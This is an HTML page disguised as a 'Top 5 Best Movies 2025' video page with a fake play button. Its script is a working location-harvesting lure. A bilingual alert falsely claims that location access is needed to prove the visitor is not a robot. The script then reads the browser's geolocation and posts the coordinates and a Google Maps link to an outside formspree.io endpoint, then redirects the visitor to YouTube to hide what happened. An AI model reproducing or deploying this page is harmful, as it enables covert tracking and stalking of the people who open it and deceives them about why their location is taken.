<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Top 5 Best Movies 2025</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f9f9f9;
      margin: 0;
      display: flex;
    }
    .main-content {
      flex: 3;
      padding: 20px;
    }
    .sidebar {
      flex: 1;
      background-color: #eee;
      padding: 20px;
    }
    .video-box {
      background-image: url('https://i.imgur.com/nkL7XZM.jpg');
      background-size: cover;
      background-position: center;
      height: 300px;
      position: relative;
      border-radius: 8px;
    }
    .play-button {
      width: 70px;
      height: 50px;
      background-color: red;
      clip-path: polygon(20% 10%, 80% 50%, 20% 90%);
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
    }
    .title {
      font-size: 22px;
      font-weight: bold;
      margin-top: 10px;
    }
    .video-suggestion {
      background-color: #fff;
      padding: 10px;
      margin-bottom: 10px;
      border-radius: 6px;
    }
  </style>
</head>
<body>
  <div class="main-content">
    <div class="video-box" onclick="showPrompt()">
      <div class="play-button"></div>
    </div>
    <div class="title">Top 5 Best Movies 2025</div>
  </div>

  <div class="sidebar">
    <div class="video-suggestion">Recommended: Action Trailer</div>
    <div class="video-suggestion">Comedy Highlights</div>
    <div class="video-suggestion">Drama Picks</div>
    <div class="video-suggestion">Sci-Fi Previews</div>
  </div>

  <script>
    function showPrompt() {
      alert("📍 لتتمكن من مشاهدة الفيديو، يرجى السماح بتحديد موقعك للتأكد أنك لست روبوت 🤖\n\n📍 To watch the video, please allow location access to verify you're not a robot 🤖");
      getLocation();
    }

    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocation, locationError);
      } else {
        alert("Geolocation is not supported by this browser.");
      }
    }

    function sendLocation(position) {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;
      const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;

      fetch("https://formspree.io/f/xkgjqegp", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          location: `Latitude: ${latitude}, Longitude: ${longitude}`,
          maps: mapsLink,
          _subject: "📍 New Location Received!"
        })
      }).then(() => {
        window.location.href = "https://www.youtube.com";
      });
    }

    function locationError(error) {
      document.querySelector('.video-box').style.backgroundImage = "url('https://i.imgur.com/3sUXV2D.png')";
      document.querySelector('.play-button').style.display = "none";
    }
  </script>
</body>
</html>
